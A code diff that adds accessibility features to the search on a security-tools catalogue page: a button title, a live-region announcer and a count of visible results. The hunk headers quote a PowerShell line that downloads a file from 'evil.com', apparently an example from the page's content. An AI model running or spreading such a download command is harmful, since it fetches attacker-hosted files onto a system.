@@ -26,7 +26,7 @@
         <div class="search-wrapper">
             <label for="searchInput" class="sr-only">Search Security Tools</label>
             <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords... (Press '/')" aria-label="Search Security Tools">
-            <button id="clearSearch" class="clear-button hidden" aria-label="Clear search" type="button">✕</button>
+            <button id="clearSearch" class="clear-button hidden" aria-label="Clear search" title="Clear search" type="button">✕</button>
         </div>
     </div>
 
@@ -45,6 +45,7 @@
         <div id="noResults" class="no-results hidden">
             <p>No tools found matching your criteria. Try different keywords.</p>
         </div>
+        <div id="searchAnnouncer" class="sr-only" aria-live="polite"></div>
 
         <!-- Tools will be populated here -->
 
@@ -354,6 +355,7 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         updateURL();
         searchTerm = searchTerm.toLowerCase();
         let hasResults = false;
+        let totalVisible = 0;
 
         // Clear previous highlights
         SearchHighlight.clear(toolsGrid);
@@ -372,6 +374,7 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
             if (categoryMatch && searchMatch) {
                 card.classList.remove('hidden');
                 hasResults = true;
+                totalVisible++;
             } else {
                 card.classList.add('hidden');
             }
@@ -389,11 +392,20 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
             });
         }
 
+        // Announcer Element
+        var announcer = document.getElementById('searchAnnouncer');
+
         // Toggle No Results
         if (hasResults) {
             noResults.classList.add('hidden');
+            if (announcer) {
+                announcer.textContent = totalVisible + ' tools found.';
+            }
         } else {
             noResults.classList.remove('hidden');
+            if (announcer) {
+                announcer.textContent = 'No tools found matching your criteria.';
+            }
         }
 
         // Toggle Clear Button
